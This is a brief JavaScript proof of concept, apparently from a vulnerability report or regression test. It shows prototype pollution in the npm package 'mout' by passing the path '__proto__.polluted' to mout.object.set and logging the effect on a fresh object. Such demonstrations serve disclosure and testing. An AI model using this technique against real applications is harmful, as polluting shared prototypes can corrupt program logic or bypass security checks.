var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
var mout = require('mout');
var obj = {};
console.log({}.polluted);
mout.object.set(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);